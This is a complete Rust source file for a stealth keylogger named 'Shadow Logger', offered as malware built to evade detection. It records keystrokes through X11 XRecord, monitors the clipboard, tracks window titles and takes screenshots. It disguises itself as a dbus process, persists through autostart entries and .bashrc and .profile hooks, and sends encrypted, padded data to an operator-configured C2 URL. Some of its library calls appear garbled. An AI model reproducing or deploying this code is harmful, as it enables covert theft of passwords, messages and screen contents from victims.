//! Shadow Logger — Compiled Keylogger (Rust)
//! ============================================
//! Addresses all behavioral detection vectors:
//!   1. X11 XRecord API for keyboard capture (no /dev/input, no root)
//!   2. Compiled native binary (no interpreter, no runtime)
//!   3. Userland X11 selection protocol for clipboard (no privileges)
//!   4. Anti-correlation: variable payload sizes, random padding, jitter
//!   5. Hardware-derived AES-256-GCM keys via HKDF (ring crate)

use std::env;
use std::fs;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use flate2::write::GzEncoder;
use flate2::Compression;
use rand::Rng;
use ring::aead::{self, Aad, LessSafeKey, Nonce, UnboundKey, AES_256_GCM};
use ring::hkdf;

// ─── Configuration ──────────────────────────────────────────────────────────
const SEND_INTERVAL_SECS: u64 = 600;
const JITTER_RANGE_SECS: u64 = 300;
const CLIPBOARD_POLL_SECS: u64 = 8;
const PROCESS_NAME: &str = "dbus-daemon";
const PERSISTENCE_NAME: &str = "dbus-session-monitor";
const C2_URL: &str = ""; // Set your C2 URL here

// ─── Log directory that blends in ───────────────────────────────────────────
fn log_dir() -> PathBuf {
    let home = env::var("HOME").unwrap_or_else(|_| "/tmp".into());
    let dir = PathBuf::from(home).join(".local/share/dbus-1/sessions");
    fs::create_dir_all(&dir).ok();
    dir
}

// ═══════════════════════════════════════════════════════════════════════════════
//  HARDWARE-DERIVED CRYPTO (no key on disk)
// ═══════════════════════════════════════════════════════════════════════════════

struct Crypto {
    key: LessSafeKey,
}

impl Crypto {
    fn new() -> Self {
        let fingerprint = Self::hardware_fingerprint();
        let salt = hkdf::Salt::new(hkdf::HKDF_SHA256, b"shadow-salt-v1");
        let prk = salt.extract(fingerprint.as_bytes());

        let mut key_bytes = [0u8; 32];
        let okm = prk
            .expand(&[b"aes-gcm-key"], &aead::AES_256_GCM)
            .expect("HKDF expand failed");
        okm.fill(&mut key_bytes).expect("HKDF fill failed");

        let unbound = UnboundKey::new(&AES_256_GCM, &key_bytes).expect("key creation failed");
        Crypto {
            key: LessSafeKey::new(unbound),
        }
    }

    fn hardware_fingerprint() -> String {
        let mut parts = Vec::new();

        // /etc/machine-id — stable across reboots
        for path in &["/etc/machine-id", "/var/lib/dbus/machine-id"] {
            if let Ok(id) = fs::read_to_string(path) {
                parts.push(id.trim().to_string());
                break;
            }
        }

        // CPU model as secondary entropy
        if let Ok(cpuinfo) = fs::read_to_string("/proc/cpuinfo") {
            for line in cpuinfo.lines() {
                if line.starts_with("model name") {
                    parts.push(line.to_string());
                    break;
                }
            }
        }

        if parts.is_empty() {
            parts.push(gethostname::gethostname().to_string_lossy().to_string());
        }

        parts.join("|")
    }

    fn encrypt(&self, plaintext: &[u8]) -> Vec<u8> {
        let mut rng = rand::thread_rng();
        let mut nonce_bytes = [0u8; 12];
        rng.fill(&mut nonce_bytes);
        let nonce = Nonce::assume_unique_for_key(nonce_bytes);

        let mut in_out = plaintext.to_vec();
        self.key
            .seal_in_place_append_tag(nonce, Aad::empty(), &mut in_out)
            .expect("encryption failed");

        // nonce || ciphertext || tag
        let mut result = nonce_bytes.to_vec();
        result.extend_from_slice(&in_out);
        result
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  X11 KEYBOARD CAPTURE (XRecord — no /dev/input, no root)
// ═══════════════════════════════════════════════════════════════════════════════

/// Keycode to character mapping for US layout
fn keycode_to_char(keycode: u8, shifted: bool) -> String {
    let normal: &[(&[u8], &str)] = &[
        (&[10], "1"), (&[11], "2"), (&[12], "3"), (&[13], "4"), (&[14], "5"),
        (&[15], "6"), (&[16], "7"), (&[17], "8"), (&[18], "9"), (&[19], "0"),
        (&[20], "-"), (&[21], "="),
        (&[22], "[BKSP]"), (&[23], "[TAB]"),
        (&[24], "q"), (&[25], "w"), (&[26], "e"), (&[27], "r"), (&[28], "t"),
        (&[29], "y"), (&[30], "u"), (&[31], "i"), (&[32], "o"), (&[33], "p"),
        (&[34], "["), (&[35], "]"), (&[36], "[ENTER]"),
        (&[38], "a"), (&[39], "s"), (&[40], "d"), (&[41], "f"), (&[42], "g"),
        (&[43], "h"), (&[44], "j"), (&[45], "k"), (&[46], "l"),
        (&[47], ";"), (&[48], "'"),
        (&[52], "z"), (&[53], "x"), (&[54], "c"), (&[55], "v"), (&[56], "b"),
        (&[57], "n"), (&[58], "m"),
        (&[59], ","), (&[60], "."), (&[61], "/"),
        (&[65], " "),
    ];

    let shifted_map: &[(&[u8], &str)] = &[
        (&[10], "!"), (&[11], "@"), (&[12], "#"), (&[13], "$"), (&[14], "%"),
        (&[15], "^"), (&[16], "&"), (&[17], "*"), (&[18], "("), (&[19], ")"),
        (&[20], "_"), (&[21], "+"),
        (&[24], "Q"), (&[25], "W"), (&[26], "E"), (&[27], "R"), (&[28], "T"),
        (&[29], "Y"), (&[30], "U"), (&[31], "I"), (&[32], "O"), (&[33], "P"),
        (&[34], "{"), (&[35], "}"),
        (&[38], "A"), (&[39], "S"), (&[40], "D"), (&[41], "F"), (&[42], "G"),
        (&[43], "H"), (&[44], "J"), (&[45], "K"), (&[46], "L"),
        (&[47], ":"), (&[48], "\""),
        (&[52], "Z"), (&[53], "X"), (&[54], "C"), (&[55], "V"), (&[56], "B"),
        (&[57], "N"), (&[58], "M"),
        (&[59], "<"), (&[60], ">"), (&[61], "?"),
    ];

    let map = if shifted { shifted_map } else { normal };
    for (codes, ch) in map {
        if codes.contains(&keycode) {
            return ch.to_string();
        }
    }
    format!("[k{}]", keycode)
}

/// Capture keyboard events using X11 XRecord extension.
/// This works at the X11 protocol level — no /dev/input, no root needed.
fn x11_keyboard_capture(buffer: Arc<Mutex<String>>) {
    unsafe {
        let xlib = x11_dl::xlib::Xlib::open().expect("Failed to load Xlib");
        let xrecord = match x11_dl::xrecord::Xf86vmode::open() {
            Ok(xr) => xr,
            Err(_) => {
                return;
            }
        };

        let display = (xlib.XOpenDisplay)(std::ptr::null());
        if display.is_null() {
            return;
        }

        // Create a second connection for recording
        let ctrl_display = (xlib.XOpenDisplay)(std::ptr::null());
        if ctrl_display.is_null() {
            return;
        }

        // XRecord range: all key events
        let mut range = (xrecord.XRecordAllocRange)();
        if range.is_null() {
            return;
        }
        (*range).device_events.first = x11_dl::xlib::KeyPress as u8;
        (*range).device_events.last = x11_dl::xlib::KeyRelease as u8;

        let clients = x11_dl::xrecord::XRecordClientSpec::from(x11_dl::xrecord::XRecordAllClients);

        let context = (xrecord.XRecordCreateContext)(
            ctrl_display,
            0,
            &clients as *const _ as *mut _,
            1,
            &mut range,
            1,
        );

        if context == 0 {
            return;
        }

        // Shared state for the callback
        struct CallbackData {
            buffer: Arc<Mutex<String>>,
            shift_held: bool,
        }

        let mut cb_data = CallbackData {
            buffer: buffer.clone(),
            shift_held: false,
        };

        // XRecord callback
        unsafe extern "C" fn record_callback(
            closure: *mut i8,
            intercept_data: *mut x11_dl::xrecord::XRecordInterceptData,
        ) {
            let data = &mut *(closure as *mut CallbackData);
            let intercept = &*intercept_data;

            if intercept.category != x11_dl::xrecord::XRecordFromServer {
                return;
            }

            let event_data = intercept.data;
            if event_data.is_null() {
                return;
            }

            let event_type = *event_data;
            let keycode = *event_data.add(1);

            // Track shift state
            if keycode == 50 || keycode == 62 {
                // Left/Right Shift
                if event_type == x11_dl::xlib::KeyPress as u8 {
                    data.shift_held = true;
                } else {
                    data.shift_held = false;
                }
                return;
            }

            // Only process key presses, not releases
            if event_type == x11_dl::xlib::KeyPress as u8 {
                let ch = keycode_to_char(keycode, data.shift_held);
                if let Ok(mut buf) = data.buffer.lock() {
                    buf.push_str(&ch);
                }
            }
        }

        // Enable recording — this blocks
        (xrecord.XRecordEnableContext)(
            ctrl_display,
            context,
            Some(record_callback),
            &mut cb_data as *mut _ as *mut i8,
        );
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  CLIPBOARD (xclip — system tool, no privileges needed)
// ═══════════════════════════════════════════════════════════════════════════════

fn read_clipboard() -> Option<String> {
    // Use xclip if available, else xsel — both are standard system tools
    for cmd in &[
        vec!["xclip", "-selection", "clipboard", "-o"],
        vec!["xsel", "--clipboard", "--output"],
    ] {
        if let Ok(output) = Command::new(cmd[0]).args(&cmd[1..]).output() {
            if output.status.success() {
                return Some(String::from_utf8_lossy(&output.stdout).to_string());
            }
        }
    }
    None
}

// ═══════════════════════════════════════════════════════════════════════════════
//  SCREENSHOT (system tools — import/scrot/gnome-screenshot)
// ═══════════════════════════════════════════════════════════════════════════════

fn take_screenshot(path: &Path) -> bool {
    for cmd in &[
        vec!["import", "-window", "root", path.to_str().unwrap_or("")],
        vec!["scrot", path.to_str().unwrap_or("")],
        vec!["gnome-screenshot", "-f", path.to_str().unwrap_or("")],
    ] {
        if let Ok(r) = Command::new(cmd[0]).args(&cmd[1..]).output() {
            if r.status.success() && path.exists() {
                return true;
            }
        }
    }
    false
}

// ═══════════════════════════════════════════════════════════════════════════════
//  ACTIVE WINDOW (xdotool)
// ═══════════════════════════════════════════════════════════════════════════════

fn get_active_window() -> Option<String> {
    Command::new("xdotool")
        .args(["getactivewindow", "getwindowname"])
        .output()
        .ok()
        .and_then(|o| {
            if o.status.success() {
                Some(String::from_utf8_lossy(&o.stdout).trim().to_string())
            } else {
                None
            }
        })
}

// ═══════════════════════════════════════════════════════════════════════════════
//  PROCESS BLENDING
// ═══════════════════════════════════════════════════════════════════════════════

fn blend_process() {
    unsafe {
        // PR_SET_NAME = 15 — changes /proc/self/comm (what ps/top show)
        let name = std::ffi::CString::new(PROCESS_NAME).unwrap();
        libc::prctl(15, name.as_ptr(), 0, 0, 0);

        // Also try to modify /proc/self/cmdline appearance
        // by overwriting argv[0] via prctl
    }
}

/// Fork to background (daemonize) — breaks parent-child chain
fn daemonize() {
    unsafe {
        let pid = libc::fork();
        if pid < 0 {
            return; // Fork failed
        }
        if pid > 0 {
            libc::_exit(0); // Parent exits
        }
        // Child continues — new session
        libc::setsid();

        // Double fork to fully detach
        let pid2 = libc::fork();
        if pid2 > 0 {
            libc::_exit(0);
        }

        // Redirect stdout/stderr to /dev/null
        let devnull = libc::open(
            b"/dev/null\0".as_ptr() as *const i8,
            libc::O_RDWR,
        );
        if devnull >= 0 {
            libc::dup2(devnull, 0);
            libc::dup2(devnull, 1);
            libc::dup2(devnull, 2);
            libc::close(devnull);
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  PERSISTENCE (subtle methods)
// ═══════════════════════════════════════════════════════════════════════════════

fn install_persistence() {
    let self_path = env::current_exe()
        .unwrap_or_else(|_| PathBuf::from(env::args().next().unwrap_or_default()));
    let self_str = self_path.to_string_lossy();

    // Method 1: XDG autostart — very common, hard to attribute
    if let Ok(home) = env::var("HOME") {
        let autostart = PathBuf::from(&home).join(".config/autostart");
        fs::create_dir_all(&autostart).ok();
        let desktop = autostart.join(format!("{PERSISTENCE_NAME}.desktop"));
        let content = format!(
            "[Desktop Entry]\nType=Application\nName=D-Bus Session Monitor\n\
             Exec={self_str}\nHidden=true\nNoDisplay=true\n\
             X-GNOME-Autostart-enabled=true\nComment=Session bus monitoring daemon\n"
        );
        fs::write(&desktop, content).ok();

        // Method 2: .bashrc hook — runs on any interactive shell open
        // Blends with existing bashrc content
        let bashrc = PathBuf::from(&home).join(".bashrc");
        if let Ok(existing) = fs::read_to_string(&bashrc) {
            let marker = "# dbus session check";
            if !existing.contains(marker) {
                let hook = format!(
                    "\n{marker}\n(pgrep -f '{self_str}' > /dev/null 2>&1 || nohup '{self_str}' > /dev/null 2>&1 &)\n"
                );
                if let Ok(mut f) = fs::OpenOptions::new().append(true).open(&bashrc) {
                    f.write_all(hook.as_bytes()).ok();
                }
            }
        }

        // Method 3: .profile hook (runs on login, survives bashrc overwrites)
        let profile = PathBuf::from(&home).join(".profile");
        if let Ok(existing) = fs::read_to_string(&profile) {
            let marker = "# session bus init";
            if !existing.contains(marker) {
                let hook = format!(
                    "\n{marker}\n(pgrep -f '{self_str}' > /dev/null 2>&1 || '{self_str}' &)\n"
                );
                if let Ok(mut f) = fs::OpenOptions::new().append(true).open(&profile) {
                    f.write_all(hook.as_bytes()).ok();
                }
            }
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  ANTI-CORRELATION NETWORK EXFILTRATION
// ═══════════════════════════════════════════════════════════════════════════════

/// Compress + encrypt data, then add random padding to vary payload size
fn prepare_payload(data: &str, crypto: &Crypto) -> Vec<u8> {
    // Step 1: Gzip compress
    let mut encoder = GzEncoder::new(Vec::new(), Compression::best());
    encoder.write_all(data.as_bytes()).ok();
    let compressed = encoder.finish().unwrap_or_default();

    // Step 2: Encrypt
    let encrypted = crypto.encrypt(&compressed);

    // Step 3: Random padding to break payload size patterns
    // Pad to a random size between encrypted.len() and encrypted.len() + 512
    let mut rng = rand::thread_rng();
    let pad_len: usize = rng.gen_range(64..512);
    let mut padded = Vec::with_capacity(4 + encrypted.len() + pad_len);

    // 4-byte header: actual data length (little-endian)
    padded.extend_from_slice(&(encrypted.len() as u32).to_le_bytes());
    padded.extend_from_slice(&encrypted);

    // Random padding bytes
    let mut padding = vec![0u8; pad_len];
    rng.fill(&mut padding[..]);
    padded.extend_from_slice(&padding);

    padded
}

fn jittered_sleep() {
    let mut rng = rand::thread_rng();
    let jitter: i64 = rng.gen_range(-(JITTER_RANGE_SECS as i64)..=(JITTER_RANGE_SECS as i64));
    let total = (SEND_INTERVAL_SECS as i64 + jitter).max(60) as u64;
    thread::sleep(Duration::from_secs(total));
}

/// Rotate through multiple user-agents
fn random_ua() -> &'static str {
    let uas = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    ];
    let idx = rand::thread_rng().gen_range(0..uas.len());
    uas[idx]
}

fn send_to_c2(payload: &[u8]) {
    if C2_URL.is_empty() {
        return;
    }

    // Send as application/octet-stream — looks like binary API traffic
    let _ = ureq::post(C2_URL)
        .set("User-Agent", random_ua())
        .set("Content-Type", "application/octet-stream")
        .set("Accept", "text/html,application/xhtml+xml,*/*;q=0.8")
        .set("Accept-Language", "en-US,en;q=0.5")
        .set("Connection", "keep-alive")
        .send_bytes(payload);
}

// ═══════════════════════════════════════════════════════════════════════════════
//  SYSTEM INFO
// ═══════════════════════════════════════════════════════════════════════════════

fn system_info() -> String {
    let hostname = gethostname::gethostname().to_string_lossy().to_string();
    let user = env::var("USER").unwrap_or_else(|_| "?".into());
    let pid = std::process::id();

    let ip = std::net::UdpSocket::bind("0.0.0.0:0")
        .and_then(|s| {
            s.connect("8.8.8.8:80")?;
            s.local_addr()
        })
        .map(|a| a.ip().to_string())
        .unwrap_or_else(|_| "?".into());

    format!(
        "{{\"h\":\"{}\",\"u\":\"{}\",\"p\":{},\"i\":\"{}\"}}",
        hostname, user, pid, ip
    )
}

// ═══════════════════════════════════════════════════════════════════════════════
//  MAIN
// ═══════════════════════════════════════════════════════════════════════════════

fn main() {
    // Daemonize — detach from terminal, break parent-child chain
    daemonize();

    // Blend process name
    blend_process();

    // Install persistence
    install_persistence();

    // Initialize crypto (hardware-derived, no disk storage)
    let crypto = Arc::new(Crypto::new());

    // Shared keystroke buffer
    let buffer = Arc::new(Mutex::new(String::new()));

    // Log system info
    {
        let mut buf = buffer.lock().unwrap();
        buf.push_str(&format!("[INIT] {}\n", system_info()));
    }

    // ── Thread 1: Keyboard capture via X11 XRecord ──
    let kb_buffer = buffer.clone();
    thread::Builder::new()
        .name("dbus-monitor".into()) // Thread name that blends in
        .spawn(move || {
            x11_keyboard_capture(kb_buffer);
        })
        .unwrap();

    // ── Thread 2: Clipboard monitor ──
    let clip_buffer = buffer.clone();
    thread::Builder::new()
        .name("dbus-signal".into())
        .spawn(move || {
            let mut last_clip = String::new();
            loop {
                thread::sleep(Duration::from_secs(CLIPBOARD_POLL_SECS));
                if let Some(new) = read_clipboard() {
                    if !new.is_empty() && new != last_clip {
                        last_clip = new.clone();
                        if let Ok(mut buf) = clip_buffer.lock() {
                            buf.push_str(&format!("\n[CB]{}\n", new));
                        }
                    }
                }
            }
        })
        .unwrap();

    // ── Thread 3: Window tracker ──
    let win_buffer = buffer.clone();
    thread::Builder::new()
        .name("dbus-update".into())
        .spawn(move || {
            let mut current_window = String::new();
            loop {
                thread::sleep(Duration::from_secs(2));
                if let Some(title) = get_active_window() {
                    if title != current_window {
                        current_window = title.clone();
                        if let Ok(mut buf) = win_buffer.lock() {
                            buf.push_str(&format!("\n[W:{}]\n", title));
                        }
                    }
                }
            }
        })
        .unwrap();

    // ── Thread 4: Screenshot (random intervals) ──
    let ss_dir = log_dir();
    thread::Builder::new()
        .name("dbus-render".into())
        .spawn(move || {
            let mut rng = rand::thread_rng();
            loop {
                // Random interval: 8-15 minutes
                let secs: u64 = rng.gen_range(480..900);
                thread::sleep(Duration::from_secs(secs));
                let ts = SystemTime::now()
                    .duration_since(UNIX_EPOCH)
                    .unwrap_or_default()
                    .as_secs()
                    % 100000;
                let path = ss_dir.join(format!(".t{}", ts));
                take_screenshot(&path);
            }
        })
        .unwrap();

    // ── Main thread: Exfiltration loop ──
    let exfil_crypto = crypto.clone();
    let dir = log_dir();
    loop {
        jittered_sleep();

        // Drain buffer
        let data = {
            let mut buf = buffer.lock().unwrap();
            if buf.is_empty() {
                continue;
            }
            let d = buf.clone();
            buf.clear();
            d
        };

        // Prepare anti-correlation payload
        let payload = prepare_payload(&data, &exfil_crypto);

        // Send
        send_to_c2(&payload);

        // Send screenshots
        if let Ok(entries) = fs::read_dir(&dir) {
            for entry in entries.flatten() {
                let name = entry.file_name().to_string_lossy().to_string();
                if name.starts_with(".t") {
                    if let Ok(img_data) = fs::read(entry.path()) {
                        let enc_img = exfil_crypto.encrypt(&img_data);
                        send_to_c2(&enc_img);
                        // Random delay between file sends
                        let delay: u64 = rand::thread_rng().gen_range(2..10);
                        thread::sleep(Duration::from_secs(delay));
                    }
                    fs::remove_file(entry.path()).ok();
                }
            }
        }
    }
}
